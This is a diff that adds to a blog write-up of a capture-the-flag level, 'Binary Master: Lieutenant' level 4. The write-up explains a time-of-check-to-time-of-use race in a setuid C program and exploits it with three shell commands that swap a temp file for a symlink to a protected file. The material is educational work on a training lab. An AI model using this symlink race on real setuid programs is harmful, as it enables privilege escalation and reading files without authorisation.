@@ -17,6 +17,16 @@ To review the previous levels, check the links below:
 * [Binary Master: Lieutenant - Level 3](https://livz.github.io/2016/03/02/binary-master-lieutenant-3.html)
 
 ## 0 - Discovery
+
+Let's see what mitigation techniques we have here, if any, using checksec.sh, downloaded and run locally:
+
+```bash
+$ checksec.sh --file level4
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   level4
+```
+So both **NX bit** and **stack canary** are enabled. Sounds difficult t oexploit but let's not worry just yet and have a look at the source code:
+
 ```c
 /*
  * Nice replacement for 'tail -f'.
@@ -38,7 +48,7 @@ int main(int argc, char** argv) {
 		return -1;
 	}
 	
-	seteuid(getuid());
+	seteuid(getuid());                                                  [1]
 	fp = fopen(argv[1], "r");
 	
 	if (fp == NULL) {
@@ -50,10 +60,10 @@ int main(int argc, char** argv) {
 	}
 	
 	fclose(fp);
-	seteuid(1006);
+	seteuid(1006);                                                      [2]	
 	
 	for (;;) {
-		fp = fopen(argv[1], "rb");
+		fp = fopen(argv[1], "rb");                                  [3]
 
 		if (fp == NULL) {
 			return -1;
@@ -77,4 +87,60 @@ int main(int argc, char** argv) {
 	return 0;
 }
 ```
+
+First, a bit about the functionality of the application:
+* The code at **[1]** _sets the effective user id_ to the actual user id running the process. The effective user id is what the OS checks when making a decision whether to allow an operation or not. To understand more about real and effective user id, check [this link](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id#32456814). 
+* Basically this call will drop the privileges temporarily to check if the real user has privileges to open a file or not.
+*  the _seteuid()_ call at **[2]** then restores the privileges by setting the effective user id to 1006 (level5), which is the actual owner of the binary:
+```
+$ id
+uid=1005(level4) gid=1005(level4) groups=1005(level4)
+$ ls -alh /levels/level4
+-rwsr-s--- 1 level5 level4 7.7K May 12 12:36 /levels/level4
+```
+
+## 1 - Vulnerability
+
+Although the program will check if the real user has privileges to open the file specified as first parameter,
+another _open()_ call is performed at **[3]** without any verification, basically introducing the TOCTOU vulnerability. So in order to exploit this we'll do a few simle stes:
+* Create a file in the /tmp folder, for which the application will have access
+* While the application is in the _for_ loop waiting for modifications on the file, replace it with a symbolic link to /home/level5/victory. At this point the level5 privileges have been regained so we'll have read access
+
+## 2 - Exploit 
+
+As said before, exploiting this is very straight-forward:
+
+```
+$ echo 123 > /tmp/file
+$ /levels/level4 /tmp/file &
+[1] 11482
+$ ln -fs /home/level5/victory /tmp/file
+```
+
+## 3 - Profit
+
+```
+
+  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
+ / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
+/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
+                     /___/                              /___/  
+                ___           __                   __   
+               / (_)___ __ __/ /____ ___ ___ ____ / /_  
+              / / // -_) // / __/ -_) _ | _ `/ _ | __/  
+             /_/_/ \__/\_,_/\__/\__/_//_|_,_/_//_|__/   
+             
+Subject: Victory!
+
+Congrats, you have solved level4. To update your score,
+send an e-mail to unlock@certifiedsecure.com and include:
+   * your CS-ID
+   * which level you solved (level4 @ binary mastery lieutenant)
+   * the exploit 
+   
+You can now start with level5. If you want, you can log in
+as level5 with password   [REDACTED]
+```
+
+That's it for now. The [final level]() which we'll see next was the most interesting for me. We'll perform a Man-in-the-Middle attack on a well-known cryptographic encryption scheme.
 
